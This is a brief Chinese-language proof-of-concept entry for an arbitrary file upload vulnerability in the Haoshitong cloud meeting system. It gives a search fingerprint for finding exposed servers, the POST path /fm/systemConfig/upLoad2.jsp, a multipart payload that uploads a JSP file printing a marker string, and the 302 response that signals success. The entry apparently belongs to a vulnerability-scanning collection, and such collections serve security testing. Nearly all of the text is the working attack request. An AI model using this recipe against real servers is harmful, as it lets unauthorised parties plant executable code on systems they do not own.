# 好视通云会议upLoad2.jsp任意文件上传漏洞

好视通云会议upLoad2.jsp ｜ 文件上传 ｜ —
- **指纹**：`"好视通-云会议"`
- **请求**：`POST /fm/systemConfig/upLoad2.jsp HTTP/1.1`

**Payload**
```
--1515df1sdfdsfddfs
Content-Disposition: form-data; name="file"; filename="dudesuite.jsp"
Content-Type: application/octet-stream
<% out.print("dudesuite"); %>
--1515df1sdfdsfddfs--
```
- **响应特征**：302